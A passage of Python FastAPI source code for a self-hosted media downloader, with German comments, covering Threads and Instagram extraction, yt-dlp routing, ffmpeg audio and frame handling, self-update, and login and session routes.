            "status": "error",
            "error": (f"Beitrag {want_code} steht nicht in der Seite — privat, gelöscht, "
                      "oder Threads liefert ihn ohne Anmeldung nicht aus. "
                      "Bei privaten Konten Cookies hinterlegen."),
        })
        log_error("Threads", f"Gesuchter Beitrag {want_code} nicht im Seiten-JSON", url)
        return None
    if anchor is None:
        # Kein Beitrag in der Adresse (Profil-Link) → längste Kette auf der
        # Seite. Hier ist es eine Auswahl, keine Vertauschung.
        posts = []
        for chain in sorted(chains, key=len, reverse=True):
            items = [p for p in (_threads_post_fields(i) for i in chain) if p]
            if items:
                posts = items
                break
    else:
        # A Threads "chain" is the author replying to their own post. Collect the
        # anchor plus every later post by the same author on this page.
        author = anchor["user"]
        posts = [p for p in all_posts
                 if p["user"] == author
                 and (p["code"] == anchor["code"]
                      or (p["taken_at"] and anchor["taken_at"]
                          and p["taken_at"] >= anchor["taken_at"]))]
        posts.sort(key=lambda p: p["taken_at"] or 0)

    if not posts:
        jobs[job_id].update({
            "status": "error",
            "error": ("Threads-Post nicht lesbar (privat, gelöscht oder Layout geändert). "
                      "Bei privaten Konten Cookies hinterlegen."),
        })
        log_error("Threads", "Kein thread_items im Seiten-JSON gefunden", url)
        return None

    # Deduplicate + keep chain order.
    seen, chain = set(), []
    for p in posts:
        if p["code"] and p["code"] in seen:
            continue
        seen.add(p["code"])
        chain.append(p)

    author = chain[0]["user"] or "threads"
    # Vor dem Textblock, nicht erst beim Herunterladen der Medien: die
    # Textdateien tragen denselben Stamm und werden zuerst geschrieben.
    # Threads-Beiträge haben keinen Shortcode in der Adresse, deshalb nur
    # Konto und Job-Kennung. Die beiden Zahlen an den Medien bleiben — die
    # erste ist der Beitrag in der Kette, die zweite das Medium darin.
    stem = media_stem("threads", author=author, job_id=job_id)
    when = datetime.fromtimestamp(chain[0]["taken_at"]).strftime("%d.%m.%Y %H:%M") \
        if chain[0]["taken_at"] else ""

    # ── Text: thread.md (whole chain, numbered) + thread.txt ──
    md = [f"# Threads-Post von @{author}", "", f"- **Quelle:** {url}"]
    if when:
        md.append(f"- **Datum:** {when}")
    if len(chain) > 1:
        md.append(f"- **Beiträge in der Kette:** {len(chain)}")
    md.append("")
    plain = []
    for i, p in enumerate(chain, 1):
        if len(chain) > 1:
            md.append(f"## {i}/{len(chain)}")
            md.append("")
        if p["text"]:
            md += [p["text"], ""]
            plain.append(p["text"])
    # Gleicher Stamm wie die Medien — siehe die Begründung beim
    # Instagram-Pfad: feste Namen kollidieren im Sammelordner.
    (job_dir / f"{stem}_Text.md").write_text("\n".join(md), encoding="utf-8")
    (job_dir / f"{stem}_Text.txt").write_text("\n\n".join(plain) + "\n", encoding="utf-8")

    # ── Media ──
    # Dieselbe Auswahl wie beim Instagram-Pfad: eine Kette kann Fotos und
    # Videos mischen, und bisher kam immer beides.
    want = jobs.get(job_id, {}).get("media", "alle")
    n = 0
    for i, p in enumerate(chain, 1):
        if want == "fotos":
            p = {**p, "videos": []}
        elif want == "videos":
            p = {**p, "images": []}
        for j, iu in enumerate(p["images"], 1):
            try:
                await asyncio.to_thread(_meta_save, iu,
                                        job_dir / f"{stem}_{i:02d}_{j}.jpg"); n += 1
            except Exception:
                pass
        for j, vu in enumerate(p["videos"], 1):
            dest = job_dir / f"{stem}_{i:02d}_{j}.mp4"
            try:
                await asyncio.to_thread(_meta_save, vu, dest); n += 1
                if audio_only and dest.exists():
                    mp3 = await _extract_audio(str(dest), _audio_fmt(job_id))
                    if mp3:
                        dest.unlink(missing_ok=True)
            except Exception:
                pass

    files = sorted(str(p) for p in job_dir.glob("*") if p.is_file())
    words = len(" ".join(plain).split())
    label = (f"{len(chain)} Posts" if len(chain) > 1 else "Post") + \
            (f" + {n} Medien" if n else " (nur Text)")
    jobs[job_id].update({
        "status": "done", "progress": 100, "filepaths": files,
        "filepath": files[0] if files else "", "filename": label,
        "transcript": "\n\n".join(plain),
        "meta": {"title": (plain[0][:80] if plain else f"Threads @{author}"),
                 "uploader": author, "webpage_url": url,
                 "upload_date": datetime.fromtimestamp(chain[0]["taken_at"]).strftime("%Y%m%d")
                 if chain[0]["taken_at"] else "",
                 "description": "\n\n".join(plain), "extractor": "Threads",
                 "chain_len": len(chain), "word_count": words},
    })
    # Der Rückfall zeigte auf thread.md — eine Datei, die seit der Umbenennung
    # nicht mehr existiert. Er greift nur, wenn `files` leer ist, also selten;
    # genau deshalb wäre es lange unbemerkt geblieben.
    return files[0] if files else str(job_dir / f"{stem}_Text.md")


def _ig_walk(node, out: list, want_code: str = ""):
    """Collect Instagram post objects (carousel or single) from embedded JSON."""
    if isinstance(node, dict):
        code = node.get("code")
        looks_like_post = bool(node.get("carousel_media") or node.get("image_versions2")
                               or node.get("video_versions"))
        if looks_like_post and code and (not want_code or code == want_code):
            out.append(node)
        for v in node.values():
            _ig_walk(v, out, want_code)
    elif isinstance(node, list):
        for v in node:
            _ig_walk(v, out, want_code)


async def _download_instagram_media(job_id: str, url: str, cookies: str,
                                    audio_only: bool = False) -> str | None:
    """Instagram image posts and carousels — the case yt-dlp refuses ("No video
    formats found") and gallery-dl cannot reach without a login. Reads the JSON
    Instagram embeds in its own page, same schema as Threads."""
    jobs[job_id]["status"] = "running"
    job_dir = DOWNLOAD_DIR / f"i_{job_id[:8]}"
    job_dir.mkdir(exist_ok=True)

    m = re.search(r"/(?:p|reel|tv)/([A-Za-z0-9_-]+)", url)
    want_code = m.group(1) if m else ""

    try:
        html = await asyncio.to_thread(_meta_fetch, url, cookies)
    except Exception as e:
        jobs[job_id].update({"status": "error", "error": f"Instagram nicht erreichbar: {e}"})
        return None

    candidates: list = []
    for payload in _meta_json_blocks(html):
        _ig_walk(payload, candidates, want_code)
    if not candidates:                       # fall back to any post on the page
        for payload in _meta_json_blocks(html):
            _ig_walk(payload, candidates, "")

    if not candidates:
        jobs[job_id].update({
            "status": "error",
            "error": ("Instagram-Post nicht lesbar (privat, gelöscht oder Login nötig). "
                      "Für private Konten Cookies hinterlegen."),
        })
        log_error("Instagram", "Kein Post-Objekt im Seiten-JSON gefunden", url)
        return None

    # Richest object wins: the one with the most carousel children.
    post = max(candidates, key=lambda p: len(p.get("carousel_media") or []))
    fields = _threads_post_fields({"post": post}) or {}
    images, videos = fields.get("images", []), fields.get("videos", [])
    text = fields.get("text", "")
    author = fields.get("user", "")

    # Hier gibt es den Shortcode aus der URL, und der ist die beste Kennung,
    # die zu haben ist: er benennt den Beitrag weltweit und bleibt derselbe,
    # auch wenn man ihn ein Jahr später erneut lädt. Er lag die ganze Zeit in
    # `want_code` und wanderte nie in einen Dateinamen.
    stem = media_stem("ig", author=author, ident=want_code, job_id=job_id)

    # Ein Karussell kann Fotos UND Videos enthalten. Vorher kam immer alles.
    want = jobs.get(job_id, {}).get("media", "alle")
    if want == "fotos":
        videos = []
    elif want == "videos":
        images = []
    n = 0
    for i, iu in enumerate(images, 1):
        try:
            await asyncio.to_thread(_meta_save, iu,
                                    job_dir / f"{stem}_{i:02d}.jpg"); n += 1
        except Exception:
            pass
    for i, vu in enumerate(videos, 1):
        dest = job_dir / f"{stem}_{i:02d}.mp4"
        try:
            await asyncio.to_thread(_meta_save, vu, dest); n += 1
            if audio_only and dest.exists():
                if await _extract_audio(str(dest), _audio_fmt(job_id)):
                    dest.unlink(missing_ok=True)
        except Exception:
            pass

    if text:
        md = [f"# Instagram-Post{' von @' + author if author else ''}", "",
              f"- **Quelle:** {url}", "", text, ""]
        # Mit demselben Stamm wie die Medien. Die Bilder wurden eindeutig
        # benannt, diese beiden hießen weiter caption.md und caption.txt —
        # also genau die Kollision, die behoben werden sollte, nur eine Datei
        # weiter. Wer zehn Posts an einem Tag in einen Ordner lädt, behält
        # eine Bildunterschrift von zehn.
        (job_dir / f"{stem}_Text.md").write_text("\n".join(md), encoding="utf-8")
        (job_dir / f"{stem}_Text.txt").write_text(text + "\n", encoding="utf-8")

    files = sorted(str(p) for p in job_dir.glob("*") if p.is_file())
    if not files:
        jobs[job_id].update({"status": "error", "error": "Keine Medien im Post gefunden."})
        return None

    label = f"{n} Medien" if n > 1 else (Path(files[0]).name if files else "Post")
    jobs[job_id].update({
        "status": "done", "progress": 100, "filepaths": files, "filepath": files[0],
        "filename": label,
        "meta": {"title": (text[:80] if text else label), "uploader": author,
                 "webpage_url": url, "description": text, "extractor": "Instagram"},
    })
    return files[0]


async def _download_url(job_id: str, url: str, cookies: str, quality: str,
                        audio_only: bool, all_parts: bool = False) -> str | None:
    """Router: Threads → eigener Extractor; Instagram-Video → yt-dlp, und wenn
    das mangels Video scheitert, der eigene Bild-/Carousel-Extractor;
    gallery-dl bleibt als dritte Stufe (greift nur mit Cookies)."""
    if _is_threads(url):
        return await _download_threads(job_id, url, cookies, audio_only)

    is_ig = "instagram.com" in url.lower()
    want = jobs.get(job_id, {}).get("media", "alle")

    # „Nur Fotos" muss yt-dlp überspringen, sonst ist die Auswahl wirkungslos.
    # Die Reihenfolge hier war: erst yt-dlp, und nur wenn das NICHTS findet,
    # der Bild-/Carousel-Pfad. Bei jedem Reel und jedem gemischten Karussell
    # ist yt-dlp erfolgreich — der Filter sitzt aber im zweiten Pfad, also kam
    # trotz „Nur Fotos" das Video. Der Filter war für genau den Fall gebaut,
    # den Till beschrieben hat, und griff genau dort nicht.
    if not (is_ig and want == "fotos"):
        fp = await _download_single(job_id, url, cookies, quality, audio_only, all_parts)
        if fp is not None or not is_ig:
            return fp
        jobs[job_id].pop("error", None)

    # yt-dlp fand kein Video (oder wurde übersprungen) — Bild-/Carousel-Pfad.
    fp = await _download_instagram_media(job_id, url, cookies, audio_only)
    if fp is None:
        jobs[job_id].pop("error", None)
        # gallery-dl kennt die Auswahl nicht. Als Rückfall bei „alle" in
        # Ordnung; bei gesetztem Filter würde es ihn stillschweigend
        # umgehen, und ein ignorierter Filter ist schlimmer als ein
        # fehlendes Ergebnis.
        if want == "alle":
            fp = await _download_gallery(job_id, url, cookies, audio_only)
    return fp


async def _extract_stills(video_path: str, mode: str, duration) -> list[str]:
    """Extract frames for visual AI analysis. mode: 'one' | 'auto'.
    'auto' spreads ~N frames across the clip, N scaled to its length."""
    vp = Path(video_path)
    stem = vp.with_suffix("")
    if mode == "one":
        out = f"{stem}_still.jpg"
        code, _, _ = await run_cmd(["ffmpeg", "-y", "-i", str(vp), "-vf", "thumbnail",
                                    "-frames:v", "1", out])
        return [out] if code == 0 and Path(out).exists() else []
    # auto: choose frame count by duration (min 4, ~1 per 30s, cap 24)
    try:
        dur = float(duration)
    except (TypeError, ValueError):
        dur = 0
    n = 8 if dur <= 0 else max(4, min(24, int(dur // 30) or 4))
    interval = max(1.0, dur / n) if dur > 0 else 5.0
    pattern = f"{stem}_still_%03d.jpg"
    code, _, _ = await run_cmd(["ffmpeg", "-y", "-i", str(vp), "-vf", f"fps=1/{interval:.3f}",
                                "-frames:v", str(n + 2), pattern])
    return sorted(str(p) for p in DOWNLOAD_DIR.glob(vp.stem + "_still_*.jpg"))


# Audio mode: which container/codec comes out. "original" keeps whatever the
# source carries (usually AAC or Opus) without re-encoding — no quality loss,
# smallest file, but not every player takes every codec. MP3 stays the default
# because it plays everywhere.
AUDIO_FORMATS = {
    # key: (yt-dlp --audio-format, ffmpeg codec args, file extension)
    "mp3":      ("mp3",  ["-c:a", "libmp3lame", "-q:a", "2"], "mp3"),
    "m4a":      ("m4a",  ["-c:a", "aac", "-b:a", "192k"], "m4a"),
    "opus":     ("opus", ["-c:a", "libopus", "-b:a", "128k"], "opus"),
    "original": ("best", None, None),
}


def _audio_fmt(job_id: str) -> str:
    f = (jobs.get(job_id) or {}).get("audio_fmt", "mp3")
    return f if f in AUDIO_FORMATS else "mp3"


async def _extract_audio(video_path: str, fmt: str = "mp3") -> str | None:
    vp = Path(video_path)
    _, codec, ext = AUDIO_FORMATS.get(fmt, AUDIO_FORMATS["mp3"])
    if codec is None:
        # Copy the audio stream as it is. MP4 sources carry AAC, so .m4a is
        # the honest container; anything else goes into Matroska audio.
        code, out_, _ = await run_cmd(["ffprobe", "-v", "error", "-select_streams", "a:0",
                                       "-show_entries", "stream=codec_name",
                                       "-of", "csv=p=0", str(vp)])
        name = (out_ or "").strip().lower()
        ext = {"aac": "m4a", "mp3": "mp3", "opus": "opus", "vorbis": "ogg"}.get(name, "mka")
        codec = ["-c:a", "copy"]
    out = f"{vp.with_suffix('')}.{ext}"
    code, _, _ = await run_cmd(["ffmpeg", "-y", "-i", str(vp), "-vn", *codec, out])
    return out if code == 0 and Path(out).exists() else None


async def _extract_audio_mp3(video_path: str) -> str | None:
    return await _extract_audio(video_path, "mp3")


def _read_info_json(filepath: str, url: str) -> dict:
    """Read yt-dlp's .info.json sidecar, extract AI-relevant fields, then remove it."""
    import json
    info_path = Path(filepath).with_suffix(".info.json")
    if not info_path.exists():
        # yt-dlp names it "<stem-without-media-ext>.info.json"; glob as fallback.
        cands = list(DOWNLOAD_DIR.glob(Path(filepath).stem + "*.info.json"))
        info_path = cands[0] if cands else None
    meta = {"webpage_url": url}
    if info_path and info_path.exists():
        try:
            d = json.loads(info_path.read_text(encoding="utf-8", errors="replace"))
            meta = {
                "title": d.get("title") or "",
                "uploader": d.get("uploader") or d.get("channel") or "",
                "webpage_url": d.get("webpage_url") or url,
                "duration": d.get("duration"),
                "upload_date": d.get("upload_date") or "",
                "description": (d.get("description") or "").strip(),
                "extractor": d.get("extractor_key") or d.get("extractor") or "",
                "language": d.get("language") or "",
            }
        except Exception:
            pass
        info_path.unlink(missing_ok=True)
    return meta


def _file_fingerprint(path: str, chunk: int = 262_144) -> str:
    """Cheap content fingerprint: size + head + tail hash. Two identical media
    files always match; reading only the ends keeps big videos fast."""
    p = Path(path)
    size = p.stat().st_size
    h = hashlib.sha256(str(size).encode())
    with p.open("rb") as f:
        h.update(f.read(chunk))
        if size > chunk * 2:
            f.seek(-chunk, os.SEEK_END)
            h.update(f.read(chunk))
    return h.hexdigest()


def _dedupe_files(paths: list[str]) -> tuple[list[str], list[str]]:
    """Return (kept, removed). Identical content downloaded twice is deleted."""
    seen: dict[str, str] = {}
    kept, removed = [], []
    for p in paths:
        try:
            fp = _file_fingerprint(p)
        except OSError:
            kept.append(p)
            continue
        if fp in seen:
            removed.append(p)
            try:
                Path(p).unlink()
            except OSError:
                pass
        else:
            seen[fp] = p
            kept.append(p)
    return kept, removed


async def _merge_videos(filepaths: list[str], resolution: str) -> str | None:
    """ffmpeg concat with scale+pad to target resolution."""
    try:
        w, h = [int(x) for x in resolution.split("x")]
    except Exception:
        w, h = 1080, 1920

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = DOWNLOAD_DIR / f"merged_{timestamp}.mp4"
    n = len(filepaths)

    filter_parts = []
    for i in range(n):
        filter_parts.append(
            f"[{i}:v]scale={w}:{h}:force_original_aspect_ratio=decrease,"
            f"pad={w}:{h}:(ow-iw)/2:(oh-ih)/2:black,fps=30,setsar=1[v{i}];"
        )
        filter_parts.append(f"[{i}:a]aresample=44100[a{i}];")

    concat_inputs = "".join(f"[v{i}][a{i}]" for i in range(n))
    filter_parts.append(f"{concat_inputs}concat=n={n}:v=1:a=1[vout][aout]")

    cmd = ["ffmpeg", "-y"]
    for fp in filepaths:
        cmd += ["-i", fp]
    cmd += [
        "-filter_complex", "".join(filter_parts),
        "-map", "[vout]",
        "-map", "[aout]",
        "-c:v", "libx264", "-preset", "ultrafast", "-crf", "26", "-threads", "2",
        "-c:a", "aac", "-b:a", "128k",
        str(out_file),
    ]

    code, _, _ = await run_cmd(cmd)
    if code == 0 and out_file.exists():
        return str(out_file)
    return None


# ── Routes ─────────────────────────────────────────────────────────────────────

def _render(name: str, ctx: dict) -> HTMLResponse:
    """Render, then translate. The templates stay monolingual German — see
    i18n.translate_html for why that is the cheaper trade."""
    html = templates.get_template(name).render(**ctx)
    return HTMLResponse(i18n.translate_html(html, ctx.get("lang", i18n.DEFAULT_LANG)))


@app.get("/", response_class=HTMLResponse)
async def index(request: Request, user: dict = Depends(current_user)):
    return _render("index.html", {
        "request": request, "username": user["username"],
        # Admin is about governing other people's use of a shared instance.
        # On the desktop there are no other people.
        "is_admin": bool(user.get("is_admin")) and not LOCAL_MODE,
        **_brand_ctx(request),
    })


@app.get("/health")
async def health():
    return {"status": "ok"}


# ── yt-dlp version + self-update ──────────────────────────────────────────────

_ytdlp_version = {"value": "?", "checked": None, "updating": False}


async def _read_ytdlp_version() -> str:
    try:
        code, out, _ = await run_ytdlp(["--version"])
        v = (out or "").strip().splitlines()[-1] if out.strip() else "?"
        _ytdlp_version["value"] = v
        _ytdlp_version["checked"] = datetime.now().isoformat()
        return v
    except Exception:
        return _ytdlp_version["value"]


async def _self_update():
    """Die pip-Komponenten aktualisieren — und sagen, wie es ausging.

    Hier stand `except Exception: pass`, und der Rückgabewert von pip wurde
    nicht angesehen. Beides zusammen heißt: ein gescheitertes Update ist von
    einem erfolgreichen nicht zu unterscheiden. Die Oberfläche fragte danach
    die Version ab, bekam die alte, und schrieb »ist aktuell« — die
    beruhigendste mögliche Antwort auf einen Fehlschlag.

    Zwei Durchläufe, weil die Kanäle verschieden sind: yt-dlp als Vorabversion
    (dort ist die Nightly die brauchbare), alles andere stabil. In einem
    Aufruf mit --pre würde man sich stillschweigend Vorabversionen von
    gallery-dl und der JS-Laufzeit mitinstallieren, und genau solche
    unbeaufsichtigten Vorabversionen hat das Security-Review beanstandet.
    """
    if _ytdlp_version["updating"]:
        return
    _ytdlp_version["updating"] = True
    failures: list[str] = []
    try:
        # sys.executable -m pip, not bare "pip": in the Mac app the server
        # runs inside its own virtualenv, and a bare pip resolves to whichever
        # one is first on PATH — usually the system one, which would install
        # the update somewhere the app never looks.
        import sys
        # Nur anfassen, was pip auch hält. Sonst installiert ein Update auf
        # einer Maschine mit Homebrew ein zweites ffmpeg als Wheel daneben —
        # und hätte nichts aktualisiert, dafür aber die Werkzeugsuche
        # mehrdeutig gemacht.
        have = _installed_pip_versions()
        stable = [p for p, m in PIP_COMPONENTS.items()
                  if not m["pre"] and p.lower().replace("-", "_") in have]
        runs = [(["yt-dlp[default]"], True)] + ([(stable, False)] if stable else [])
        for pkgs, pre in runs:
            cmd = [sys.executable, "-m", "pip", "install", "--no-cache-dir",
                   "--upgrade", *(["--pre"] if pre else []), *pkgs]
            code, _, err = await run_cmd(cmd)
            if code != 0:
                # Die letzte Zeile von pip ist die, die den Grund nennt; der
                # Rest ist Auflösungsprotokoll und hilft niemandem.
                tail = (err or "").strip().splitlines()
                failures.append(f"{', '.join(pkgs)}: {tail[-1][:160] if tail else f'pip endete mit {code}'}")
        await _read_ytdlp_version()
        _components.clear()          # the overview below is now stale
        await _check_ytdlp_latest()  # danach ist „verfügbar" eine andere Zahl
    except Exception as e:
        failures.append(str(e)[:200])
    finally:
        _ytdlp_version["updating"] = False
        _last_update.update(at=datetime.now().isoformat(timespec="seconds"),
                            ok=not failures, detail="; ".join(failures)[:400])
        if failures:
            log_error("self-update", _last_update["detail"])


# ── What is actually installed ────────────────────────────────────────────────
# Every one of these has broken something at least once: a missing JS runtime
# looks exactly like an IP ban, a yt-dlp three weeks old fails on videos that
# worked yesterday, and a Whisper backend that quietly fell back to CPU just
# feels slow. Showing the versions turns each of those from a mystery into a
# glance.

_components: dict[str, dict] = {}


async def _component_versions() -> dict:
    if _components:
        return _components

    async def ver(cmd: list[str], pick=lambda s: s.strip().splitlines()[0] if s.strip() else "") -> str:
        try:
            code, out, err = await run_cmd(cmd)
            return pick(out or err) if code == 0 else ""
        except Exception:
            return ""

    import sys
    ffmpeg = await ver(["ffmpeg", "-version"],
                       pick=lambda s: (s.split("Copyright")[0].replace("ffmpeg version", "").strip()
                                       if s.strip() else ""))
    # "deno 2.8.3 (stable, release, aarch64-apple-darwin)" → "2.8.3"
    deno = await ver(["deno", "--version"],
                     pick=lambda s: (s.strip().splitlines()[0].replace("deno ", "").split(" (")[0]
                                     if s.strip() else ""))
    gdl = await ver(["gallery-dl", "--version"])

    whisper = ""
    if WHISPER_ENABLED:
        whisper = (f"mlx · {WHISPER_MODEL}" if _mlx_available()
                   else f"CPU · {WHISPER_MODEL}")

    _components.update({
        "yt_dlp": _ytdlp_version.get("value", "?"),
        "gallery_dl": gdl,
        "ffmpeg": ffmpeg,
        # The one that is not optional: without a JS runtime YouTube's
        # n-challenge is unsolvable and only throttled formats come through.
        "js_runtime": f"Deno {deno}" if deno else "",
        "python": sys.version.split()[0],
        "whisper": whisper,
        "mode": "lokal" if LOCAL_MODE else "Server",
        "clients": YT_CLIENTS,
        "pot": False,
        **(private_ext.components() if private_ext else {}),
        "browser_cookies": BROWSER_COOKIES or "",
    })
    return _components


@app.get("/api/version")
async def version():
    if _ytdlp_version["value"] == "?":
        await _read_ytdlp_version()
    return {**_ytdlp_version, "retention_h": CLEAN_AGE_H,
            "components": await _component_versions(),
            # What the check found, kept separate from what is installed so
            # that "a newer one exists" never reads like "it updated itself".
            "latest": _ytdlp_latest["value"],
            "latest_checked": _ytdlp_latest["checked"],
            "behind": _ytdlp_latest["behind"],
            # Pro Komponente, nicht nur yt-dlp: Deno und ffmpeg liegen in
            # derselben venv und veralten genauso, nur sieht man das am
            # Versionsstand von yt-dlp nicht.
            "pip": list(_latest.values()),
            "last_update": _last_update}


def require_maintainer(request: Request) -> dict:
    """Wer darf den Extraktor aktualisieren.

    Auf einem Server: nur ein Administrator — ein Update tauscht Code aus, den
    alle Nutzer danach ausführen. Auf dem Desktop gibt es keine anderen
    Nutzer; dort wäre eine Admin-Prüfung eine Hürde ohne Schutzwirkung, und
    sie würde in einer Datenbank, deren erster Account aus irgendeinem Grund
    kein Administrator ist, den Knopf unerreichbar machen. Genau das macht
    ClipGrab richtig: es fragt niemanden, weil niemand zu fragen ist.
    """
    user = current_user(request)
    if _desktop_request(request):
        return user
    if not user.get("is_admin"):
        raise HTTPException(403, "Nur Admin")
    return user


@app.post("/api/update")
async def update(background_tasks: BackgroundTasks,
                 user: dict = Depends(require_maintainer)):
    background_tasks.add_task(_self_update)
    return {"updating": True, "current": _ytdlp_version["value"]}


@app.post("/api/version/check")
async def version_check(user: dict = Depends(current_user)):
    """Jetzt nachsehen, ohne auf das Tagesintervall zu warten.

    Lesen darf jeder, der angemeldet ist — es ist dieselbe Auskunft, die der
    Hintergrundlauf ohnehin holt, und sie verrät nichts über die Instanz.
    """
    return await _check_ytdlp_latest()


# ── Language ──────────────────────────────────────────────────────────────────

@app.post("/api/lang")
async def set_language(request: Request, lang: str = Form(...)):
    """Remember a language choice. Deliberately open — the login page needs it
    too, and a language preference is not worth protecting.

    The redirect target comes from the Referer header but is checked: only a
    same-origin path is followed, never a full URL from elsewhere. An open
    redirect here would be a gift to anyone phishing this instance's users.
    """
    chosen = i18n.normalize(lang)
    target = "/"
    ref = request.headers.get("referer", "")
    if ref:
        try:
            from urllib.parse import urlparse
            p = urlparse(ref)
            if p.netloc == request.url.netloc and p.path.startswith("/"):
                target = p.path
        except Exception:
            pass

    resp = RedirectResponse(target, status_code=303)
    resp.set_cookie(
        i18n.COOKIE_NAME, chosen,
        max_age=365 * 24 * 3600, httponly=False, samesite="lax",
        secure=request.url.scheme == "https",
    )
    return resp


# ── Auth: login page, register, logout ────────────────────────────────────────

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    mode = _signup_mode()
    return _render("login.html", {
        "request": request,
        "signup_required": mode == "code",
        "signup_closed": mode == "closed",
        "first_user": mode == "first", **_brand_ctx(request),
    })


@app.get("/api/signup-required")
async def signup_required():
    mode = _signup_mode()
    return {"mode": mode, "required": mode == "code", "closed": mode == "closed",
            "first_user": mode == "first"}


def _is_https(request: Request) -> bool:
    return (request.headers.get("x-forwarded-proto", "").split(",")[0].strip() == "https"
            or request.url.scheme == "https")


def _set_session(resp: JSONResponse, uid: int, request: Request):
    resp.set_cookie("hd_session", _sign(uid), httponly=True, samesite="lax",
                    secure=_is_https(request), max_age=60 * 60 * 24 * 30)


@app.post("/api/register")
async def register(request: Request, username: str = Form(...), password: str = Form(...), code: str = Form("")):
    mode = _signup_mode()
    if mode == "closed":
        raise HTTPException(403, "Registrierung ist geschlossen. Der Betreiber muss dich anlegen.")
    if mode == "code" and not secrets.compare_digest(code.strip(), SIGNUP_CODE):
        raise HTTPException(403, "Falscher oder fehlender Einladungscode.")
    if len(username.strip()) < 2 or len(password) < 6:
        raise HTTPException(400, "Username min. 2, Passwort min. 6 Zeichen.")
    user = await asyncio.to_thread(db.create_user, username, password)
    if not user:
        raise HTTPException(409, "Username bereits vergeben.")
    resp = JSONResponse({"ok": True, "admin": bool(user.get("is_admin"))})
    _set_session(resp, user["id"], request)
    return resp


_login_fails: dict[str, list[float]] = {}

# Per-user throttle for expensive jobs (downloads/ingest). Keeps one account
# from monopolising a small server; generous enough for normal use.
BATCH_MAX_PER_HOUR = int(os.environ.get("BATCH_MAX_PER_HOUR", "300"))
# Hard cap per request. Downloads run sequentially to stay under the platforms'
# rate limits, so a huge batch means a very long wait — better to say so than
# to silently queue an hour of work.
BATCH_MAX_URLS = int(os.environ.get("BATCH_MAX_URLS", "150"))
# Rough per-URL estimate used for the "this will take ~n minutes" warning.
SECONDS_PER_URL = int(os.environ.get("SECONDS_PER_URL", "12"))
_batch_calls: dict[int, list[float]] = {}


def _batch_throttle(uid: int, n_urls: int):
    now = time.time()
    calls = [t for t in _batch_calls.get(uid, []) if now - t < 3600]
    if len(calls) + n_urls > BATCH_MAX_PER_HOUR:
        _batch_calls[uid] = calls
        raise HTTPException(429, f"Limit erreicht: max. {BATCH_MAX_PER_HOUR} URLs pro Stunde. "
                                 "Kurz warten oder das lokale Script nutzen.")
    _batch_calls[uid] = calls + [now] * n_urls


def _throttle_check(ip: str):
    """Simple brute-force guard: max 8 failed logins per IP per 10 minutes."""
    now = time.time()
    fails = [t for t in _login_fails.get(ip, []) if now - t < 600]
    _login_fails[ip] = fails
    if len(fails) >= 8:
        raise HTTPException(429, "Zu viele Fehlversuche. Bitte ein paar Minuten warten.")


def _throttle_fail(ip: str):
    _login_fails.setdefault(ip, []).append(time.time())


@app.post("/api/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    ip = _client_ip(request)
    _throttle_check(ip)
    user = await asyncio.to_thread(db.verify_user, username, password)
    if not user:
        _throttle_fail(ip)
        raise HTTPException(401, "Falscher Username oder Passwort.")
    if user.get("blocked"):
        raise HTTPException(403, "Account blockiert.")
    resp = JSONResponse({"ok": True, "admin": bool(user.get("is_admin"))})
    _set_session(resp, user["id"], request)
    return resp


@app.post("/api/logout")
async def logout():
    resp = JSONResponse({"ok": True})
    resp.delete_cookie("hd_session")
    return resp


@app.get("/api/me")
async def me(user: dict = Depends(current_user)):
    return {"username": user["username"], "is_admin": bool(user.get("is_admin")),
            "api_token": user["api_token"]}


@app.post("/api/me/token/rotate")
async def rotate_token(user: dict = Depends(current_user)):
    """New MCP token for the signed-in user; every old copy stops working.

    POST, so the desktop gate's same-origin check applies: a link on another
    site must not be able to invalidate someone's assistant setup.
    """
    token = db.rotate_api_token(user["id"])
    if not token:
        raise HTTPException(404, "Unbekannter Nutzer.")
    return {"api_token": token}


@app.get("/robots.txt", response_class=PlainTextResponse)
async def robots():
    return "User-agent: *\nDisallow: /\n"


@app.get("/api/livestream-script")
async def livestream_script(request: Request,
                            url: str = "", mode: str = "now", quality: str = "1080",
                            name: str = "livestream", path: str = "~/Downloads",
                            start: str = "00:00:00", end: str = "00:05:00",
                            user: dict = Depends(current_user)):
    """Die Livestream-Befehle vom Server, nicht aus dem Browser.

    Es gab dieselbe Logik zweimal: hier in Python und als `genLive()` im
    Template. Als die festen Format-Nummern durch Ausdrücke ersetzt wurden,
    geschah das nur in der Python-Hälfte — die Oberfläche erzeugte weiter
    `-f 96` und `f137.mp4.part`, also genau die Befehle, die den Fehler
    „Requested format is not available" ausgelöst haben. Behoben war der
    Fehler damit nur für Assistenten über MCP, nicht für Menschen.

    Ein Spiegel, den niemand prüft, driftet. Deshalb gibt es ihn nicht mehr.
    """
    if mode not in ("now", "start", "section", "merge", "scan"):
        raise HTTPException(400, "Unbekannter Modus.")
    out = build_livestream_script(url, mode, quality, name, path, start, end)

    # Übersetzen muss hier passieren, nicht im Browser. Die Oberfläche
    # übersetzt beim Rendern der Seite über die I18N-Tabelle; was danach per
    # fetch nachkommt, läuft daran vorbei. Ohne das hätte das Verschieben der
    # Erzeugung auf den Server englischen Nutzern deutsche Warnungen beschert
    # — eine Regression, die erst beim Umschalten der Sprache auffällt.
    lang = i18n.resolve(
        query_lang=request.query_params.get("lang", ""),
        cookie_lang=request.cookies.get(i18n.COOKIE_NAME, ""),
        accept=request.headers.get("accept-language", ""),
    )
    tr = lambda s: i18n.translate(s, lang) if s else s
    out["title"] = tr(out.get("title", ""))
    out["warning"] = tr(out.get("warning", ""))
    out["steps"] = [{**s, "t": tr(s.get("t", ""))} for s in out.get("steps", [])]
    return out


# Fonts are served from here rather than a CDN: a font request from a
# third-party host hands every visitor's IP address to that host, which under
# the GDPR needs a reason the operator would have to supply (LG München I,
# 3 O 17493/20). Fixed allowlist, no path from the request reaches the disk.
_FONT_DIR = Path(__file__).resolve().parent / "fonts"
_FONTS = {f.name for f in _FONT_DIR.glob("*.woff2")} if _FONT_DIR.is_dir() else set()


@app.get("/fonts/{name}")
async def font_file(name: str):
    if name not in _FONTS:
        raise HTTPException(404)
    return FileResponse(_FONT_DIR / name, media_type="font/woff2",
                        headers={"Cache-Control": "public, max-age=31536000, immutable"})


@app.get("/api/podcast/auftragszettel.md", response_class=PlainTextResponse)
async def podcast_order_sheet_brief(request: Request):
    """The brief an assistant needs in order to produce a usable order sheet.

    Deliberately without a login. The point is to hand the URL to an assistant
